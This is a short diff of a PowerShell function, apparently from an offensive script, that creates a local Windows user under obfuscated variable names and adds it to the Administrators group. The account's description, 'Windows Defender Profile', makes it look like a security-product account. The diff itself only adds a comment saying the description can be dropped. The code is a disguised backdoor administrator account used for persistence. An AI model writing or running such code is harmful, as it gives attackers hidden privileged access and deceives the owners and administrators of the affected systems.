@@ -12,7 +12,7 @@ function create_account {
     begin {
     }    
     process {
-        New-LocalUser "$xf061name" -Password $xf061pass -FullName "$xf061name" -Description "Windows Defender Profile"
+        New-LocalUser "$xf061name" -Password $xf061pass -FullName "$xf061name" -Description "Windows Defender Profile" # can remove description parameter if want
         # Write-Verbose "$xf061name local user crated"
         Add-LocalGroupMember -Group "Administrators" -Member "$xf061name"
         # Write-Verbose "$xf061name added to the local administrator group"
